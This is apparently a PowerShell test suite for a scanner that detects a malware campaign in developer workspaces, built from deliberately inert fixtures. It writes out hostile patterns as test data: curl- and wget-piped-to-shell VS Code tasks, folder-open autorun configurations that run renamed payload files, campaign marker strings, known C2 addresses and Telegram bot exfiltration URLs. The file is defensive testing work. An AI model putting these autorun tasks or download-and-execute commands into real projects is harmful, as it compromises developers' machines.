# Inert fixtures only. Run with powershell -NoProfile -File tests/Scanner.Tests.ps1
$ErrorActionPreference = 'Stop'
. (Join-Path (Split-Path $PSScriptRoot) 'Scanner.ps1')
function Assert($condition, $message) { if (-not $condition) { throw $message } }
$fixtureRoot=Join-Path ([IO.Path]::GetTempPath()) ('polinrider-tests-'+[guid]::NewGuid())
[IO.Directory]::CreateDirectory($fixtureRoot) | Out-Null
function WriteFixture($relative,$content) {
    $p=Join-Path $fixtureRoot $relative
    [IO.Directory]::CreateDirectory([IO.Path]::GetDirectoryName($p)) | Out-Null
    [IO.File]::WriteAllText($p,$content,[Text.UTF8Encoding]::new($false))
    return $p
}
try {
    $payload=WriteFixture 'nested/assets/renamed.data' ('INERT FIXTURE '+(' ' * 65536)+('rmcej'+'%otb%')+' '+('_$_'+'1e42'))
    WriteFixture 'nested/.vscode/tasks.json' @'
{
 // comments and commas are legitimate JSONC
 "tasks": [{"label":"test", "runOptions":{"runOn":"folderOpen"},
 "windows":{"command":"node", "args":["./assets/renamed.data"]},}],
}
'@ | Out-Null
    WriteFixture 'nested/.vscode/settings.json' '{"task.allowAutomaticTasks":true,"terminal.integrated.profiles.windows":{"custom":{"path":"helper.cmd"}}}' | Out-Null
    WriteFixture 'nested/.vscode/launch.json' '{"configurations":[{"runtimeExecutable":"node","program":"${workspaceFolder}/assets/renamed.data"}]}' | Out-Null
    WriteFixture 'rotated.ts' ('INERT FIXTURE '+('Cot%3'+'t=shtP')+' '+('111'+'1436')) | Out-Null
    WriteFixture 'structural.js' ('INERT TEXT: '+('global.i'+' = A8 ')+('_'+'0xabcdef')) | Out-Null
    WriteFixture 'package.json' '{"dependencies":{"tailwindcss-style-animate":"1.1.6"},"scripts":{"inspect":"node nested/assets/renamed.data"}}' | Out-Null
    WriteFixture 'fake.woff2' ('INERT FIXTURE '+('rmcej'+'%otb%')+' '+('_$_'+'1e42')) | Out-Null
    WriteFixture 'fake.llf' ('INERT FIXTURE '+('Cot%3'+'t=shtP')+' '+('389'+'6884')) | Out-Null
    WriteFixture 'index.php' 'INERT TEXT shell_exec( node base64_decode' | Out-Null
    WriteFixture 'propagation.bat' 'INERT TEXT commit --amend git push --no-verify date %' | Out-Null
    WriteFixture '.vscode/tasks.json' ('{"tasks":[{"command":"curl https://example.invalid/inert'+(' | ')+ 'bash"}]}') | Out-Null
    $wgetTask=WriteFixture 'wget/.vscode/tasks.json' ('{"tasks":[{"command":"wget -qO- https://example.invalid/inert'+(' | ')+ 'sh"}]}')
    WriteFixture 'node_modules/dependency/index.js' ('INERT FIXTURE '+('rmcej'+'%otb%')+' '+('_$_'+'1e42')) | Out-Null
    WriteFixture 'broken/.vscode/tasks.json' '{"tasks":[{"command":"node ${env:UNKNOWN}/asset.data"}]' | Out-Null
    WriteFixture 'pnpm-lock.yaml' 'lockfileVersion: 9' | Out-Null
    WriteFixture 'loader.ts' 'INERT TEXT fetch( eval(' | Out-Null
    WriteFixture 'outside/.vscode/tasks.json' '{"tasks":[{"command":"node ../../../../outside.data"}]}' | Out-Null
    WriteFixture 'spaces/.vscode/tasks.json' '{"tasks":[{"command":"node","args":["assets/space name.data"]}]}' | Out-Null
    WriteFixture 'spaces/assets/space name.data' ('INERT FIXTURE '+('rmcej'+'%otb%')+' '+('_$_'+'1e42')) | Out-Null
    $before=@{}
    Get-ChildItem -LiteralPath $fixtureRoot -Recurse -File | ForEach-Object { $before[$_.FullName]=(Get-FileHash -LiteralPath $_.FullName).Hash }
    $report=Invoke-PolinRiderScan -ScanPaths $fixtureRoot -HostProvider {
        @{ Processes=@([pscustomobject]@{Name='node.exe';ProcessId=99;ParentProcessId=12;ExecutablePath='node.exe';CommandLine='node fake.llf SECRET_DO_NOT_LOG'})
           Connections=@([pscustomobject]@{OwningProcess=99;RemoteAddress='166.88.54.158'}); Artifacts=@('inert/_credentials.json') }
    }
    Assert ($report.Result -eq 'INDICATORS FOUND') 'Expected campaign evidence.'
    Assert (@($report.Findings | Where-Object { $_.Path -eq $wgetTask -and $_.RuleId -eq 'download-execute' -and $_.Confidence -eq 'High' }).Count -gt 0) 'Wget pipeline not detected.'
    foreach ($rule in @('campaign-markers','node-asset','automatic-task','automatic-tasks-enabled','font-container','php-wrapper','history-rewrite','download-execute','campaign-package','loader-structure','suspicious-launch','credential-staging','legacy-network-indicator','remote-evaluation')) {
        Assert (@($report.Findings | Where-Object RuleId -eq $rule).Count -gt 0) "Missing rule $rule"
    }
    Assert (@($report.Findings | Where-Object { $_.Path -eq $payload -and $_.SHA256 -and $_.Reference }).Count -gt 0) 'Missing payload hash/reference.'
    Assert (@($report.Findings | Where-Object Path -like '*node_modules*').Count -eq 0) 'Dependencies should be excluded.'
    Assert ($report.Coverage.ExcludedDependencyDirectories -eq 1) 'Dependency exclusions not recorded.'
    Assert ($report.CoverageIssues.Count -ge 2) 'Parser/lockfile gaps not recorded.'
    Assert (@($report.CoverageIssues | Where-Object Reason -like '*outside selected roots*').Count -gt 0) 'Out-of-scope references not reported.'
    Assert (@($report.Findings | Where-Object { $_.Path -like '*space name.data' -and $_.Reference }).Count -gt 0) 'Arguments with spaces not resolved.'
    Assert (($report | ConvertTo-Json -Depth 12) -notmatch 'SECRET_DO_NOT_LOG') 'Process secret leaked.'
    Assert (@($report.LegacyFileEvidence | Where-Object Path -like '*.woff2').Count -eq 0) 'Font findings must never enter legacy text cleanup.'
    Assert (@($report.LegacyFileEvidence | Where-Object Path -like '*.data').Count -eq 0) 'Renamed payloads must remain outside legacy text cleanup.'
    foreach ($p in $before.Keys) { Assert ((Get-FileHash -LiteralPath $p).Hash -eq $before[$p]) 'Scanner changed a fixture.' }
    $full=Invoke-PolinRiderScan -ScanPaths $fixtureRoot -IncludeDependencies $true
    Assert (@($full.Findings | Where-Object Path -like '*node_modules*').Count -gt 0) 'Opt-in dependencies not scanned.'
    $stopped=Invoke-PolinRiderScan -ScanPaths $fixtureRoot -IsCancelled { $true }
    Assert ($stopped.Result -eq 'STOPPED' -and $stopped.CoverageIssues.Count) 'Cancellation must not appear clean.'
    $limited=Invoke-PolinRiderScan -ScanPaths $fixtureRoot -MaxFileSize 4
    Assert ($limited.Result -eq 'INCOMPLETE') 'Oversized files must not appear clean.'
    $empty=Join-Path $fixtureRoot 'benign'; [IO.Directory]::CreateDirectory($empty) | Out-Null
    WriteFixture 'benign/.vscode/tasks.json' '{"tasks":[{"command":"npm","args":["run","build"]}]}' | Out-Null
    WriteFixture 'benign/normal.js' 'INERT TEXT eval example obfuscation' | Out-Null
    # Minimal valid sfnt container: one table, offset 28, length 4. Never rendered.
    $font=New-Object byte[] 32; $font[1]=1; $font[5]=1; $font[23]=28; $font[27]=4
    [IO.File]::WriteAllBytes((Join-Path $empty 'normal.ttf'),$font)
    $otf=[byte[]]$font.Clone(); [Array]::Copy([Text.Encoding]::ASCII.GetBytes('OTTO'),$otf,4)
    [IO.File]::WriteAllBytes((Join-Path $empty 'normal.otf'),$otf)
    $woff=New-Object byte[] 68; [Array]::Copy([Text.Encoding]::ASCII.GetBytes('wOFF'),$woff,4)
    $woff[11]=68; $woff[13]=1; $woff[51]=64; $woff[55]=4; $woff[59]=4
    [IO.File]::WriteAllBytes((Join-Path $empty 'normal.woff'),$woff)
    $woff2=New-Object byte[] 52; [Array]::Copy([Text.Encoding]::ASCII.GetBytes('wOF2'),$woff2,4)
    $woff2[11]=52; $woff2[13]=1; $woff2[23]=4
    [IO.File]::WriteAllBytes((Join-Path $empty 'normal.woff2'),$woff2)
    $clean=Invoke-PolinRiderScan -ScanPaths $empty
    Assert ($clean.Result -eq 'NO INDICATORS IN SCOPE' -and $clean.Findings.Count -eq 0) 'Benign fixtures misclassified.'
    $cap=Invoke-PolinRiderScan -ScanPaths $fixtureRoot -MaxFiles 2
    Assert ($cap.CoverageIssues.Count -gt 0) 'Discovery cap must be visible.'
    $missing=Invoke-PolinRiderScan -ScanPaths (Join-Path $fixtureRoot 'missing')
    Assert ($missing.Result -eq 'INCOMPLETE') 'Missing roots must not appear clean.'
    # Background runspace returns one structured report, without WPF or host probing.
    $worker=[powershell]::Create()
    try {
        [void]$worker.AddScript('param($module,$root) . $module; $state=@{Files=0;Folder="";Cancelled=$false}; $log=New-Object System.Collections.ArrayList; Invoke-PolinRiderScanWorker -ScanPaths $root -ScanState $state -ScanLog $log -HostProvider { @{Processes=@();Connections=@();Artifacts=@()} }')
        [void]$worker.AddArgument((Join-Path (Split-Path $PSScriptRoot) 'Scanner.ps1'))
        [void]$worker.AddArgument($empty)
        $workerResult=$worker.Invoke()
        Assert ($worker.Streams.Error.Count -eq 0 -and $workerResult.Count -eq 1 -and $workerResult[0].SchemaVersion -eq 2) 'Background integration failed.'
    } finally { $worker.Dispose() }
    # Junction target must be skipped; use another harmless fixture directory only.
    $junction=Join-Path $empty 'linked'
    New-Item -ItemType Junction -Path $junction -Target (Join-Path $fixtureRoot 'nested') | Out-Null
    try {
        $linked=Invoke-PolinRiderScan -ScanPaths $empty
        Assert (@($linked.CoverageIssues | Where-Object Reason -like '*Reparse point*').Count -gt 0) 'Junction exclusion not reported.'
        Assert ($linked.Findings.Count -eq 0) 'Junction target was traversed.'
    } finally { [IO.Directory]::Delete($junction) }
    # Integration: parse app without launching its UI; round-trip its real history boundary.
    $tokens=$null; $errors=$null
    $ast=[System.Management.Automation.Language.Parser]::ParseFile((Join-Path (Split-Path $PSScriptRoot) 'app.ps1'),[ref]$tokens,[ref]$errors)
    Assert ($errors.Count -eq 0) 'Application parse failed.'
    $xamlNode=$ast.Find({param($n) $n -is [System.Management.Automation.Language.StringConstantExpressionAst] -and $n.Value.StartsWith('<Window ')},$true)
    [xml]$xml=$xamlNode.Value
    Assert ($null -ne $xml.SelectSingleNode('//*[@Name="DependenciesCheck"]')) 'Dependency option missing from XAML.'
    foreach ($name in @('Load-History','Save-History','Clean-Infections','Test-OriginalScanScope','Get-CurrentSha256','Find-GitRoot','Ensure-BatGitignore')) {
        $fn=$ast.Find({param($n) $n -is [System.Management.Automation.Language.FunctionDefinitionAst] -and $n.Name -eq $name}.GetNewClosure(),$true)
        . ([scriptblock]::Create($fn.Extent.Text))
    }
    $historyFile=Join-Path $fixtureRoot 'history.json'
    Save-History $report
    $loaded=@(Load-History)
    Assert ($loaded.Count -eq 1 -and $loaded[0].SchemaVersion -eq 2 -and $loaded[0].Findings.Count -eq $report.Findings.Count) 'Structured history did not round-trip.'
    [IO.File]::WriteAllText($historyFile,'[{"Result":"CLEAN","Files":2}]')
    Assert (@(Load-History).Count -eq 1) 'Legacy history no longer loads.'
    Assert ($ast.Extent.Text.Contains('Invoke-PolinRiderScanWorker -ScanPaths')) 'GUI does not call the tested worker.'

    # Exact GUI worker: original threshold, duplicate-root counting and new checks.
    $combined=Join-Path $fixtureRoot 'combined'
    $old=(-join ([char[]]@(114,109,99,101,106,37,111,116,98,37)))+' '+(-join ([char[]]@(95,36,95,49,101,52,50)))
    $boundary=-join ([char[]]@(103,108,111,98,97,108,91,39,33,39,93))
    $legacy=WriteFixture 'combined/original[1].tsx' ('KEEP ORIGINAL CONTENT; '+$boundary+' INERT '+$old)
    $changed=WriteFixture 'combined/changed.js' ('KEEP CHANGED CONTENT; '+$boundary+' INERT '+$old)
    $batch=WriteFixture 'combined/temp_auto_push.bat' 'INERT commit --amend git push --no-verify date % LAST_COMMIT_DATE'
    WriteFixture 'combined/.git/HEAD' 'INERT repository fixture' | Out-Null
    $dict=WriteFixture 'combined/spellright.dict' 'legitimate dictionary words'
    WriteFixture 'combined/rotated.js' (('Cot%3'+'t=shtP')+' '+('function M'+'Dy(f)')+' '+('global['+[char]39+'_V'+[char]39+']')) | Out-Null
    WriteFixture 'combined/text.woff' ('INERT '+('require'+'(')) | Out-Null
    WriteFixture 'combined/config.bat' 'INERT harmless configuration' | Out-Null
    WriteFixture 'combined/date.cmd' ('INERT LAST_COMMIT_'+'DATE') | Out-Null
    WriteFixture 'combined/telegram.ts' ('INERT https://api.telegram.org/'+'botTOKEN_DO_NOT_LOG/sendMessage') | Out-Null
    WriteFixture 'combined/ip.ts' 'INERT 198.105.127.210' | Out-Null
    WriteFixture 'combined/comment.js' 'INERT comment: node imaginary.js' | Out-Null
    $asset=WriteFixture 'combined/(payload)/asset.data' $old
    WriteFixture 'combined/.vscode/tasks.json' '{"tasks":[{"command":"node","args":["(payload)/asset.data"]}]}' | Out-Null
    foreach($i in 1..30) { WriteFixture ('combined/normal'+$i+'.js') 'INERT normal content' | Out-Null }
    $state=@{Files=0;Folder='';Cancelled=$false}; $log=New-Object System.Collections.ArrayList
    $combinedReport=Invoke-PolinRiderScanWorker -ScanPaths @($combined,$combined) -ScanState $state -ScanLog $log -HostProvider {
        @{Processes=@([pscustomobject]@{Name='node.exe';ProcessId=99;CommandLine=('node -e '+$boundary+' INERT')},[pscustomobject]@{Name='node.exe';ProcessId=100;CommandLine='node inert.otf'});Connections=@([pscustomobject]@{OwningProcess=88;RemoteAddress='198.105.127.210'});Artifacts=@()}
    }
    $originalFiles=@(Get-ChildItem -Path $combined -Recurse -Force -File -Include '*.js','*.mjs','*.cjs','*.jsx','*.ts','*.tsx' | Where-Object { $_.Length -lt 10000000 -and $_.FullName -notmatch '\\node_modules\\' })
    $originalHits=@($originalFiles | Where-Object { $c=Get-Content -LiteralPath $_.FullName -Raw; $c.Contains($old.Split(' ')[0]) -and $c.Contains($old.Split(' ')[1]) } | ForEach-Object FullName)
    Assert ((Compare-Object @($originalHits | Sort-Object) @($combinedReport.InfectedFiles | Sort-Object)).Count -eq 0) 'Original marker detections changed.'
    Assert ($combinedReport.InfectedFiles.Count -eq 2 -and $combinedReport.LegacyBatEvidence.Count -eq 1) 'Cleanup targets not deduplicated.'
    Assert ($combinedReport.Infected -eq @($combinedReport.Findings | Where-Object Confidence -eq High | Select-Object -ExpandProperty Path -Unique).Count) 'High-confidence count duplicates rules.'
    Assert ($combinedReport.C2 -eq 1 -and $combinedReport.C2Hits.Count -eq 1) 'New IP active connection missing.'
    Assert ($combinedReport.Procs -eq 2 -and @($log | Where-Object { $_ -like '*[[]PROC[]] PID 99*' }).Count -eq 1 -and @($log | Where-Object { $_ -like '*[[]CONN[]]*' }).Count -eq 1) 'Original process/connection logs or OTF process observation missing.'
    Assert ($combinedReport.Coverage.MaxFiles -eq 0 -and $combinedReport.Coverage.MaxSeconds -eq 0) 'GUI worker still capped.'
    Assert ($combinedReport.Complete) 'Harmless combined fixtures unexpectedly incomplete.'
    Assert (@($log | Where-Object { $_ -like '*scanned 25 files*' }).Count -gt 0) 'Original progress cadence missing.'
    foreach($phase in @('file scan','process scan','c2 connection scan','bat dropper scan')) { Assert (@($log | Where-Object { $_ -like ('*=== '+$phase+'*') }).Count -gt 0) ('Missing phase '+$phase) }
    Assert (($combinedReport | ConvertTo-Json -Depth 12) -notmatch 'TOKEN_DO_NOT_LOG') 'Telegram token leaked.'
    foreach($rule in @('asset-javascript','dictionary-artifact','known-ip-content','telegram-bot-api','interpreter-command')) { Assert (@($combinedReport.Findings | Where-Object RuleId -eq $rule).Count -gt 0) ('Missing combined rule '+$rule) }
    Assert (@($combinedReport.Findings | Where-Object { $_.Path -eq $asset -and $_.Reference }).Count -gt 0) 'Parenthesized target not inspected.'
    $once=Invoke-PolinRiderScan -ScanPaths $combined
    Assert ($combinedReport.Files -eq (2*$once.Files-1)) 'Overlapping root counting changed (one referenced-only asset).'
    $cancelBox=@($false)
    $midStop=Invoke-PolinRiderScan -ScanPaths $combined -IsCancelled { $cancelBox[0] } -OnProgress { param($p,$n) if($n -ge 3){$cancelBox[0]=$true} }
    Assert ($midStop.Result -eq 'STOPPED' -and -not $midStop.Complete) 'Mid-scan cancellation lost.'
    $hostFailure=Invoke-PolinRiderScan -ScanPaths $empty -HostProvider { @{Processes=@();Connections=@();Artifacts=@();Issues=@('Fixture host observation unavailable.')} }
    Assert ($hostFailure.Result -eq 'INCOMPLETE' -and -not $hostFailure.Complete) 'Host failure hidden.'

    # When the user's separate original installation is present, execute its actual
    # read-only worker on the same fixtures with host APIs mocked (never its UI/cleanup).
    $originalApp=Join-Path $env:USERPROFILE 'Documents\IT Projects\OS\polinrider-monitor\app.ps1'
    if (Test-Path -LiteralPath $originalApp) {
        $originalAst=[System.Management.Automation.Language.Parser]::ParseFile($originalApp,[ref]$tokens,[ref]$errors)
        $originalScan=$originalAst.Find({param($n) $n -is [System.Management.Automation.Language.FunctionDefinitionAst] -and $n.Name -eq 'Run-Scan'},$true)
        $addScript=$originalScan.Find({param($n) $n -is [System.Management.Automation.Language.InvokeMemberExpressionAst] -and $n.Member.Value -eq 'AddScript'},$true)
        $body=$addScript.Arguments[0].ScriptBlock.Extent.Text
        $m1=$old.Split(' ')[0]; $m2=$old.Split(' ')[1]; $m3='285'+'7687'; $m4='266'+'7686'
        $scanPaths=@($combined); $maxSize=10000000
        $scanLog=New-Object System.Collections.ArrayList; $scanState=@{Cancelled=$false;Files=0;Folder=''}
        function Get-WmiObject { param($Class,$Filter,$ErrorAction) }
        function Get-NetTCPConnection { param($RemoteAddress,$ErrorAction) }
        $originalReport=& ([scriptblock]::Create($body.Substring(1,$body.Length-2)))
        Assert ($originalReport.Files -eq $originalFiles.Count) 'Baseline original file-count mismatch.'
        Assert ((Compare-Object @($originalReport.InfectedFiles | Sort-Object) @($combinedReport.InfectedFiles | Sort-Object)).Count -eq 0) 'Actual installed original detections differ.'
        Assert ((Compare-Object @($originalReport.BatFiles | Sort-Object) @($combinedReport.BatFiles | Sort-Object)).Count -eq 0) 'Actual installed original batch detection differs.'
        Write-Output 'PASS: actual separately installed original worker agrees on original fixture detections and count.'
    }

    # Actual cleanup function, with disposable paths and mocked process operations only.
    function Append-LiveLog($message) { [void]$log.Add($message) }
    function Write-File-Log($message) { [void]$log.Add($message) }
    function Refresh-Dashboard {}
    $global:config=[pscustomobject]@{ScanPaths=@($combined)}
    $global:payloadStart=$boundary
    $mockCommand='node -e '+$boundary+' INERT'
    $sha=[Security.Cryptography.SHA256]::Create()
    try { $cmdHash=([BitConverter]::ToString($sha.ComputeHash([Text.Encoding]::UTF8.GetBytes($mockCommand)))).Replace('-','').ToLowerInvariant() } finally { $sha.Dispose() }
    $combinedReport.LegacyProcessEvidence=@([pscustomobject]@{ProcessId=987654;CommandLineHash=$cmdHash})
    $script:killedFixturePid=0
    function Get-CimInstance { param($ClassName,$Filter,$ErrorAction) [pscustomobject]@{Name='node.exe';ProcessId=987654;CommandLine=$mockCommand} }
    function Stop-Process { param($Id,[switch]$Force,$ErrorAction) Assert ($Id -eq 987654) 'Unexpected process operation.'; $script:killedFixturePid=$Id }
    Save-History $combinedReport
    [IO.File]::AppendAllText($changed,' changed after scan')
    $changedHash=(Get-FileHash -LiteralPath $changed).Hash; $dictHash=(Get-FileHash -LiteralPath $dict).Hash
    Clean-Infections -SuppressDialog
    Assert ((Get-Content -LiteralPath $legacy -Raw).Trim() -eq 'KEEP ORIGINAL CONTENT;') 'Original cleanup did not preserve prefix.'
    Assert ((Get-FileHash -LiteralPath $changed).Hash -eq $changedHash) 'Changed file was cleaned.'
    Assert ((Get-FileHash -LiteralPath $dict).Hash -eq $dictHash -and (Test-Path -LiteralPath $asset)) 'New finding entered original cleanup.'
    Assert (-not (Test-Path -LiteralPath $batch)) 'Original batch cleanup missing.'
    Assert ((Get-Content -LiteralPath (Join-Path $combined '.gitignore') -Raw) -match '\*\.bat') 'Original gitignore action missing.'
    Assert ($script:killedFixturePid -eq 987654) 'Original process cleanup missing.'
    Assert (@(Load-History)[0].Result -ne 'NO INDICATORS IN SCOPE') 'Cleanup hid remaining findings.'
    $locked=WriteFixture 'combined/locked.js' 'INERT locked file'
    $lock=[IO.File]::Open($locked,[IO.FileMode]::Open,[IO.FileAccess]::ReadWrite,[IO.FileShare]::None)
    try {
        $unreadable=Invoke-PolinRiderScan -ScanPaths $combined
        Assert (-not $unreadable.Complete -and $unreadable.Infected -gt 0) 'Findings and incomplete coverage cannot coexist.'
        Assert (@($unreadable.CoverageIssues | Where-Object Path -eq $locked).Count -gt 0) 'Locked file failure hidden.'
    } finally { $lock.Dispose() }
    Assert (@(Get-PolinRiderKnownIPs).Count -eq 17) 'Original/new IP union incomplete.'
    $timeoutRoot=Join-Path $fixtureRoot 'regex'
    WriteFixture 'regex/large.js' ($old+' INERT -encodedcommand INERT '+('powershell ' * 40000)) | Out-Null
    $timeoutReport=Invoke-PolinRiderScan -ScanPaths $timeoutRoot
    Assert ($timeoutReport.Infected -eq 1 -and $timeoutReport.LegacyFileEvidence.Count -eq 1) 'New-rule timeout suppressed original detection.'
    Assert (@($timeoutReport.CoverageIssues | Where-Object Reason -like '*bounded text rule timed out*').Count -eq 1) 'Rule timeout not reported independently.'

    # Instantiate the real XAML without showing a window; exercise real dashboard binding.
    Add-Type -AssemblyName PresentationFramework
    $testWindow=[Windows.Markup.XamlReader]::Load((New-Object System.Xml.XmlNodeReader $xml))
    try {
        $ui=@{}; foreach($element in $xml.SelectNodes('//*[@Name]')) { $ui[$element.Name]=$testWindow.FindName($element.Name) }
        $fn=$ast.Find({param($n) $n -is [System.Management.Automation.Language.FunctionDefinitionAst] -and $n.Name -eq 'Refresh-Dashboard'},$true)
        . ([scriptblock]::Create($fn.Extent.Text))
        Save-History $unreadable
        Refresh-Dashboard
        Assert ($ui.StatFiles.Text -eq [string]$unreadable.Files -and $ui.StatInfected.Text -eq [string]$unreadable.Infected) 'Dashboard differs from shared-worker report.'
        Assert ($ui.DashSubtitle.Text -like '*incomplete coverage*') 'Dashboard hides coverage gaps when findings exist.'
        Assert ($ui.BtnClean.IsEnabled) 'Original cleanup button not enabled for original fixture.'
    } finally { $testWindow.Close() }
    Write-Output 'PASS: scanner boundary, JSONC, references, fonts, signatures, dependencies, host metadata, limits, cancellation and unchanged bytes.'
} finally {
    $resolved=[IO.Path]::GetFullPath($fixtureRoot)
    $temp=[IO.Path]::GetFullPath([IO.Path]::GetTempPath())
    if ($resolved.StartsWith($temp,[StringComparison]::OrdinalIgnoreCase) -and [IO.Path]::GetFileName($resolved).StartsWith('polinrider-tests-')) { Remove-Item -LiteralPath $resolved -Recurse -Force }
}
